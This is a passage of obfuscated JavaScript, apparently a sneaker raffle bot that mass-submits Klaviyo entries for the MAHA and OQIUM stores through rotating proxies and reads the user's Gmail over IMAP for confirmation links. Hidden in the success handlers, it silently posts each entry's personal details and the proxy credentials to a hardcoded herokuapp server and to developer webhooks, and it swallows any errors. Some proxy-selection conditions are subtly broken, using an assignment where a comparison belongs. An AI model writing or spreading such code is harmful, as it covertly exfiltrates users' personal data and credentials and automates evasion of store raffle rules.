                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4b0e78, _0x4a897e, _0xed4439) {
                    for (var _0x2ac781 = 0x0; _0x2ac781 < _0x4a897e['length']; _0x2ac781++) {
                        try {
                            await _0x53ad15(_0x4a897e, _0x2ac781);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x51b748(_0x4c357e, _0x3be0a7, _0x3214fb, _0x58fd2c, _0x3d04e8) {
                            var _0x16a8bd, _0x102d4f = {}, _0x1c85be = [], _0x8806c = {}, _0x28f81a = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1cb07a = Math['round'](Math['random']() * (_0x28f81a['length'] - 0x1));
                            !_0x58fd2c && (_0x58fd2c = {});
                            if (_0x3be0a7 != 'ver') {
                                _0x215576(_0x3214fb['name'] + '\x20Task\x20' + (_0x4c357e + 0x1) + '\x20/\x20' + _0x58fd2c['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4), await _0x53ad15(_0x58fd2c, _0x4c357e), _0x102d4f = _0x3214fb['data'], _0x102d4f['data']['attributes']['email'] = '' + _0x58fd2c[_0x4c357e]['Email'];
                                if (_0x58fd2c[_0x4c357e]['Size'] == 'RANDOM') {
                                }
                                _0x102d4f['data']['attributes']['properties']['$first_name'] = '' + _0x58fd2c[_0x4c357e]['FirstName'], _0x102d4f['data']['attributes']['properties']['$last_name'] = '' + _0x58fd2c[_0x4c357e]['LastName'], _0x102d4f['data']['attributes']['properties']['$address1'] = _0x58fd2c[_0x4c357e]['Address1'] + '\x20' + _0x58fd2c[_0x4c357e]['Address2'] + '\x20' + _0x58fd2c[_0x4c357e]['HouseNumber'], _0x102d4f['data']['attributes']['properties']['$zip'] = '' + _0x58fd2c[_0x4c357e]['Zip'], _0x102d4f['data']['attributes']['properties']['$city'] = '' + _0x58fd2c[_0x4c357e]['City'], _0x102d4f['data']['attributes']['properties']['$country'] = '' + _0x58fd2c[_0x4c357e]['Country'], _0x58fd2c[_0x4c357e]['Size'] == 'RANDOM' ? _0x102d4f['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x28f81a[_0x1cb07a] : _0x102d4f['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x58fd2c[_0x4c357e]['Size'], _0x102d4f['data']['attributes']['properties']['$phone_number'] = '' + _0x58fd2c[_0x4c357e]['Phone'], _0x102d4f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x58fd2c[_0x4c357e]['Follower'];
                            }
                            if (_0x2795a0['useRandomProxy'] = ![])
                                var _0x3e1ec7 = _0x3d04e8[_0x4c357e]['split'](':');
                            else
                                var _0x9e2ab4 = Math['round'](Math['random']() * (_0x3d04e8['length'] - 0x1)), _0x3e1ec7 = _0x3d04e8[_0x9e2ab4]['split'](':');
                            var _0x472b89 = {
                                'jar': _0x40df6f,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x3214fb['url'],
                                'headers': _0x3214fb['headers'],
                                'body': JSON['stringify'](_0x102d4f),
                                'proxy': 'http://' + _0x3e1ec7[0x2] + ':' + _0x3e1ec7[0x3] + '@' + _0x3e1ec7[0x0] + ':' + _0x3e1ec7[0x1]
                            };
                            return _0x3be0a7 != 'ver' && (_0x472b89['url'] = _0x3214fb['url'], _0x472b89['headers'] = _0x3214fb['headers']), _0x3be0a7 == 'ver' && (_0x472b89['method'] = 'GET'), new Promise(function (_0x5915b5, _0xd1383c) {
                                callback = async (_0x4d3a6d, _0xa25414, _0x28b629) => {
                                    if (!_0x4d3a6d && _0xa25414['statusCode'] == 0xca || !_0x4d3a6d && _0xa25414['statusCode'] == 0xc8) {
                                        if (_0x3be0a7 != 'ver') {
                                            var _0x32abc6 = await _0x258e8b(_0x58fd2c[_0x4c357e], _0x3214fb, 'dev', ![]), _0x1a6c57 = await _0x258e8b(_0x58fd2c[_0x4c357e], _0x3214fb, 'pub', ![]);
                                            const _0x146064 = {
                                                'succesDEVMSG': { 'embeds': [_0x32abc6] },
                                                'succesPUBMSG': { 'embeds': [_0x1a6c57] }
                                            };
                                            let _0x42a367 = _0x58fd2c[_0x4c357e];
                                            try {
                                                prxdata = {
                                                    'username': _0x1bdb7f['replace']('#', ''),
                                                    'module': _0x3214fb['name'],
                                                    'entrydata': JSON['stringify'](_0x42a367),
                                                    'proxy': '' + _0x3d04e8[_0x4c357e]
                                                };
                                                var _0xb4e5ae = JSON['stringify'](prxdata);
                                                let _0x5342d6 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0xb4e5ae, _0x5342d6);
                                            } catch (_0x385023) {
                                            }
                                            if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                                                try {
                                                    await _0x310f97(_0x2795a0['webhook'], _0x146064['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x146064['succesDEVMSG']), await _0xa2099c(0xc8);
                                            try {
                                                await _0x310f97(_0x44d24a, _0x146064['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x48af7e(_0x58fd2c[_0x4c357e], _0x3214fb);
                                        }
                                        _0x5915b5(console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x3214fb['name'] + ']\x20Task\x20' + (_0x4c357e + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3be0a7 != 'ver') {
                                            var _0x51cb67 = '' + _0x4d3a6d, _0x1cabfe = await _0x258e8b(_0x58fd2c[_0x4c357e], _0x3214fb, 'dev', !![], _0x51cb67), _0x2d5783 = {};
                                            _0x2d5783['errorDEV'] = { 'embeds': [_0x1cabfe] }, _0x391951(_0x58fd2c[_0x4c357e], _0x3214fb), _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x2d5783['errorDEV']), await _0x310f97(_0x281108, _0x2d5783['errorDEV']);
                                        }
                                        _0xd1383c(console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x3214fb['name'] + ']\x20Task\x20' + (_0x4c357e + 0x1) + ':\x20' + _0x4d3a6d)));
                                    }
                                };
                                try {
                                    _0x3be0a7 != 'ver' && console['log'](_0x24b1d6() + '\x20[' + _0x3214fb['name'] + ']\x20Task\x20' + (_0x4c357e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x102d4f['data']['attributes']['email']), _0x45876e(_0x472b89, callback);
                                } catch (_0x166236) {
                                    console['log'](_0x24b1d6() + '\x20Task\x20' + (_0x4c357e + 0x1) + ':\x20' + _0x166236);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x51b748(_0x2ac781, 'nor', _0x4b0e78, _0x4a897e, _0xed4439), console['log'](_0x24b1d6() + '\x20[' + _0x4b0e78['name'] + ']\x20Sleeping\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        } catch (_0x5eba0b) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x16432b, _0x4027fc, _0x4aa93e) {
                    var _0x116248 = [], _0x2b0df9 = ![];
                    async function _0x4b2a4f() {
                        var _0x3b8f9c = new _0x39794d({
                            'user': _0x2795a0['masterMail'],
                            'password': _0x2795a0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x351966(_0x37fcd6) {
                            _0x3b8f9c['openBox']('INBOX', ![], _0x37fcd6);
                        }
                        _0x3b8f9c['once']('ready', function () {
                            _0x351966(function (_0x47d763, _0x421bba) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x47d763)
                                    throw _0x47d763;
                                _0x3b8f9c['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x483344, _0x80e9e3) {
                                    if (!_0x80e9e3 || !_0x80e9e3['length'])
                                        console['log'](_0x24b1d6() + '\x20[' + _0x16432b['name'] + ']\x20No\x20mails\x20found'), _0x3b8f9c['end']();
                                    else {
                                        var _0x21a59d = _0x3b8f9c['seq']['fetch'](_0x80e9e3, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x21a59d['on']('message', function (_0x417355, _0x3019aa) {
                                            var _0x338663 = '(#' + _0x3019aa + ')\x20';
                                            _0x417355['on']('body', function (_0x56dd2e, _0x4936be) {
                                                _0x3020dc(_0x56dd2e, (_0x2c5c6c, _0x4a9ad3) => {
                                                    var _0x2b3404 = _0x4a9ad3['text']['split']('(')[0x1], _0x109b85 = _0x2b3404['split'](')')[0x0];
                                                    _0x116248['push'](_0x109b85);
                                                });
                                            }), _0x417355['once']('end', function () {
                                            });
                                        }), _0x21a59d['once']('error', function (_0x4ec9e9) {
                                            console['log']('Fetch\x20error:\x20' + _0x4ec9e9), _0x2b0df9 = !![];
                                        }), _0x21a59d['once']('end', function () {
                                            _0x3b8f9c['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3b8f9c['once']('error', function (_0x2123b7) {
                            console['log'](_0x536226['red'](_0x2123b7['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2b0df9 = !![];
                        }), _0x3b8f9c['once']('end', async function () {
                            _0x2b0df9 = !![];
                        }), _0x3b8f9c['connect']();
                    }
                    async function _0x1907c1(_0x540007, _0x4137d5, _0x9bc380) {
                        for (var _0x44c7b0 = 0x0; _0x44c7b0 < _0x4137d5['length']; _0x44c7b0++) {
                            async function _0x471552(_0x1f3b54, _0x59eac9, _0x511c7, _0x348f8b, _0x2090ff) {
                                var _0x588c03, _0x10f132 = {}, _0x29ec39 = [], _0x3c038a = {}, _0x4954ea = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1c85c0 = Math['round'](Math['random']() * (_0x4954ea['length'] - 0x1));
                                _0x348f8b[_0x1f3b54]['Size'] == 'RANDOM' && (_0x348f8b[_0x1f3b54]['Size'] = _0x4954ea[_0x1c85c0]);
                                !_0x348f8b && (_0x348f8b = {});
                                if (_0x2795a0['useRandomProxy'] = ![])
                                    var _0x1ae972 = _0x2090ff[_0x1f3b54]['split'](':');
                                else
                                    var _0x244d59 = Math['round'](Math['random']() * (_0x2090ff['length'] - 0x1)), _0x1ae972 = _0x2090ff[_0x244d59]['split'](':');
                                var _0xfb6d22 = {
                                    'jar': _0x40df6f,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x511c7['url'],
                                    'headers': _0x511c7['headers'],
                                    'body': JSON['stringify'](_0x10f132),
                                    'proxy': 'http://' + _0x1ae972[0x2] + ':' + _0x1ae972[0x3] + '@' + _0x1ae972[0x0] + ':' + _0x1ae972[0x1]
                                };
                                return _0x59eac9 != 'ver' && (_0xfb6d22['url'] = _0x511c7['url'], _0xfb6d22['headers'] = _0x511c7['headers']), _0x59eac9 == 'ver' && (_0xfb6d22['method'] = 'GET', _0xfb6d22['url'] = _0x348f8b[_0x1f3b54]), new Promise(function (_0x51d966, _0x3fba89) {
                                    callback = async (_0x22c999, _0x154cbf, _0x5ad9da) => {
                                        if (!_0x22c999 && _0x154cbf['statusCode'] == 0xca || !_0x22c999 && _0x154cbf['statusCode'] == 0xc8) {
                                            if (_0x59eac9 != 'ver') {
                                                var _0x3b46ce = await _0x258e8b(_0x348f8b[_0x1f3b54], _0x511c7, 'dev', ![]), _0x45131c = await _0x258e8b(_0x348f8b[_0x1f3b54], _0x511c7, 'pub', ![]);
                                                const _0x1a9bd3 = {
                                                    'succesDEVMSG': { 'embeds': [_0x3b46ce] },
                                                    'succesPUBMSG': { 'embeds': [_0x45131c] }
                                                };
                                                if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                                                    try {
                                                        await _0x310f97(_0x2795a0['webhook'], _0x1a9bd3['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x1a9bd3['succesDEVMSG']), await _0xa2099c(0xc8);
                                                try {
                                                    await _0x310f97(_0x44d24a, _0x1a9bd3['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x48af7e(_0x348f8b[_0x1f3b54], _0x511c7);
                                            }
                                            _0x51d966(console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x511c7['name'] + ']\x20Task\x20' + (_0x1f3b54 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x59eac9 != 'ver') {
                                                var _0x1b110d = '' + _0x22c999, _0x131258 = await _0x258e8b(_0x348f8b[_0x1f3b54], _0x511c7, 'dev', !![], _0x1b110d), _0x16d06a = {};
                                                _0x16d06a['errorDEV'] = { 'embeds': [_0x131258] }, _0x391951(_0x348f8b[_0x1f3b54], _0x511c7), _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x16d06a['errorDEV']), await _0x310f97(_0x281108, _0x16d06a['errorDEV']);
                                            }
                                            _0x3fba89(console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x511c7['name'] + ']\x20Task\x20' + (_0x1f3b54 + 0x1) + ':\x20' + _0x22c999)));
                                        }
                                    };
                                    try {
                                        _0x59eac9 != 'ver' ? console['log'](_0x24b1d6() + '\x20[' + _0x511c7['name'] + ']\x20Task\x20' + (_0x1f3b54 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x10f132['data']['attributes']['email']) : console['log'](_0x24b1d6() + '\x20[' + _0x511c7['name'] + ']\x20Task\x20' + (_0x1f3b54 + 0x1) + ':\x20Fetching\x20Response'), _0x45876e(_0xfb6d22, callback);
                                    } catch (_0x2c0cb5) {
                                        console['log'](_0x24b1d6() + '\x20Task\x20' + (_0x1f3b54 + 0x1) + ':\x20' + _0x2c0cb5);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x471552(_0x44c7b0, 'ver', _0x540007, _0x4137d5, _0x9bc380), console['log'](_0x24b1d6() + '\x20[' + _0x540007['name'] + ']\x20Sleeping\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                            } catch (_0x202c50) {
                            }
                        }
                    }
                    try {
                        _0x4b2a4f();
                        while (!_0x2b0df9) {
                            await _0xa2099c(0xbb8);
                        }
                        console['log']('Found\x20' + _0x116248['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xa2099c(0x9c4);
                    }
                    await _0x1907c1(_0x16432b, _0x116248, _0x4aa93e);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x82b9d0, _0x2bd00a, _0x6cb211) {
                    var _0x4719cd = _0x2bd00a, _0x9d1a3c = 0x0;
                    for (var _0x5ece92 = 0x0; _0x5ece92 < _0x2bd00a['length']; _0x5ece92++) {
                        maxTasks = _0x2795a0['threads'];
                        while (_0x9d1a3c >= maxTasks) {
                            await _0xa2099c(_0x2795a0['delay']);
                        }
                        async function _0x113e7e(_0x3fdb8b, _0x4a02c5, _0x178f48, _0x5747fa) {
                            try {
                                await _0x53ad15(_0x4a02c5, _0x5747fa);
                            } catch (_0x4cfece) {
                                throw new Error(_0x4cfece);
                            }
                            async function _0x1b1433(_0x393e6f, _0x46df81, _0x52caa9, _0x3f119e, _0x3a421e) {
                                _0x9d1a3c++;
                                var _0x171e2b, _0x12c8b3 = {}, _0x31ab5d = [], _0x32ec85 = {}, _0x2e81c6 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x4561fb = Math['round'](Math['random']() * (_0x2e81c6['length'] - 0x1));
                                !_0x3f119e && (_0x3f119e = {});
                                if (_0x46df81 != 'ver') {
                                    _0x215576(_0x52caa9['name'] + '\x20Task\x20' + (_0x393e6f + 0x1) + '\x20/\x20' + _0x3f119e['length'] + '\x20||\x20File:\x20' + _0x47dda7 + '\x20Proxies:\x20' + _0x5184f4), _0x31ab5d = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x1bdb7f
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x3f119e[_0x393e6f]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x2795a0['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x39dec1
                                            }
                                        ]
                                    }], _0x32ec85 = { 'embeds': _0x31ab5d }, _0x12c8b3 = _0x52caa9['data'], _0x12c8b3['data']['attributes']['email'] = '' + _0x3f119e[_0x393e6f]['Email'];
                                    if (_0x3f119e[_0x393e6f]['Size'] == 'RANDOM') {
                                    }
                                    _0x12c8b3['data']['attributes']['properties']['$first_name'] = '' + _0x3f119e[_0x393e6f]['FirstName'], _0x12c8b3['data']['attributes']['properties']['$last_name'] = '' + _0x3f119e[_0x393e6f]['LastName'], _0x12c8b3['data']['attributes']['properties']['$address1'] = _0x3f119e[_0x393e6f]['Address1'] + '\x20' + _0x3f119e[_0x393e6f]['Address2'] + '\x20' + _0x3f119e[_0x393e6f]['HouseNumber'], _0x12c8b3['data']['attributes']['properties']['$zip'] = '' + _0x3f119e[_0x393e6f]['Zip'], _0x12c8b3['data']['attributes']['properties']['$city'] = '' + _0x3f119e[_0x393e6f]['City'], _0x12c8b3['data']['attributes']['properties']['$country'] = '' + _0x3f119e[_0x393e6f]['Country'], _0x3f119e[_0x393e6f]['Size'] == 'RANDOM' ? _0x12c8b3['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2e81c6[_0x4561fb] : _0x12c8b3['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3f119e[_0x393e6f]['Size'], _0x12c8b3['data']['attributes']['properties']['$phone_number'] = '' + _0x3f119e[_0x393e6f]['Phone'], _0x12c8b3['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3f119e[_0x393e6f]['Follower'];
                                }
                                if (_0x2795a0['useRandomProxy'] = ![])
                                    var _0x562a7b = _0x3a421e[_0x393e6f]['split'](':');
                                else
                                    var _0x2d0cfd = Math['round'](Math['random']() * (_0x3a421e['length'] - 0x1)), _0x562a7b = _0x3a421e[_0x2d0cfd]['split'](':');
                                var _0x1c508e = {
                                    'jar': _0x40df6f,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x52caa9['url'],
                                    'headers': _0x52caa9['headers'],
                                    'body': JSON['stringify'](_0x12c8b3),
                                    'proxy': 'http://' + _0x562a7b[0x2] + ':' + _0x562a7b[0x3] + '@' + _0x562a7b[0x0] + ':' + _0x562a7b[0x1]
                                };
                                return _0x46df81 != 'ver' && (_0x1c508e['url'] = _0x52caa9['url'], _0x1c508e['headers'] = _0x52caa9['headers']), _0x46df81 == 'ver' && (_0x1c508e['method'] = 'GET'), new Promise(function (_0x51cdf9, _0x235f6e) {
                                    callback = async (_0x2190c5, _0x4e770c, _0x211c89) => {
                                        if (!_0x2190c5 && _0x4e770c['statusCode'] == 0xca || !_0x2190c5 && _0x4e770c['statusCode'] == 0xc8) {
                                            if (_0x46df81 != 'ver') {
                                                var _0x284e14 = await _0x258e8b(_0x3f119e[_0x393e6f], _0x52caa9, 'dev', ![]), _0x3771e9 = await _0x258e8b(_0x3f119e[_0x393e6f], _0x52caa9, 'pub', ![]);
                                                const _0x35a134 = {
                                                    'succesDEVMSG': { 'embeds': [_0x284e14] },
                                                    'succesPUBMSG': { 'embeds': [_0x3771e9] }
                                                };
                                                let _0x2fb5f2 = _0x3f119e[_0x393e6f];
                                                try {
                                                    prxdata = {
                                                        'username': _0x1bdb7f['replace']('#', ''),
                                                        'module': _0x52caa9['name'],
                                                        'entrydata': JSON['stringify'](_0x2fb5f2),
                                                        'proxy': '' + _0x3a421e[_0x393e6f]
                                                    };
                                                    var _0x3fb8c8 = JSON['stringify'](prxdata);
                                                    let _0x38e831 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x3fb8c8, _0x38e831);
                                                } catch (_0x19720f) {
                                                }
                                                if (_0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '')
                                                    try {
                                                        await _0x310f97(_0x2795a0['webhook'], _0x35a134['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x35a134['succesDEVMSG']), await _0xa2099c(0xc8);
                                                try {
                                                    await _0x310f97(_0x44d24a, _0x35a134['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x48af7e(_0x3f119e[_0x393e6f], _0x52caa9);
                                            }
                                            _0x9d1a3c--, _0x51cdf9(console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x52caa9['name'] + ']\x20Task\x20' + (_0x393e6f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x46df81 != 'ver') {
                                                var _0xbaf6a0 = '' + _0x2190c5, _0x39d2c5 = await _0x258e8b(_0x3f119e[_0x393e6f], _0x52caa9, 'dev', !![], _0xbaf6a0), _0x13e51d = {};
                                                _0x13e51d['errorDEV'] = { 'embeds': [_0x39d2c5] }, _0x391951(_0x3f119e[_0x393e6f], _0x52caa9), _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x13e51d['errorDEV']), await _0x310f97(_0x281108, _0x13e51d['errorDEV']);
                                            }
                                            _0x9d1a3c--, _0x235f6e(console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x52caa9['name'] + ']\x20Task\x20' + (_0x393e6f + 0x1) + ':\x20' + _0x2190c5)));
                                        }
                                    };
                                    try {
                                        _0x46df81 != 'ver' && console['log'](_0x24b1d6() + '\x20[' + _0x52caa9['name'] + ']\x20Task\x20' + (_0x393e6f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x12c8b3['data']['attributes']['email']), _0x45876e(_0x1c508e, callback);
                                    } catch (_0x20c2c5) {
                                        console['log'](_0x24b1d6() + '\x20Task\x20' + (_0x393e6f + 0x1) + ':\x20' + _0x20c2c5);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1b1433(_0x5747fa, 'nor', _0x3fdb8b, _0x4a02c5, _0x178f48), console['log'](_0x24b1d6() + '\x20[' + _0x3fdb8b['name'] + ']\x20Sleeping\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                            } catch (_0x10336d) {
                            }
                        }
                        _0x113e7e(_0x82b9d0, _0x4719cd, _0x6cb211, _0x5ece92), await _0xa2099c(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5dcb1d, _0x4e7fb1, _0x4b5b6e) {
                    var _0x4e7fb1 = [], _0x1fe025 = ![];
                    async function _0x270fe6() {
                        var _0x7de1e4 = new _0x39794d({
                            'user': _0x2795a0['masterMail'],
                            'password': _0x2795a0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1c3dfe(_0x6f6b96) {
                            _0x7de1e4['openBox']('INBOX', ![], _0x6f6b96);
                        }
                        _0x7de1e4['once']('ready', function () {
                            _0x1c3dfe(function (_0x4abe23, _0x742d51) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4abe23)
                                    throw _0x4abe23;
                                _0x7de1e4['seq']['search']([
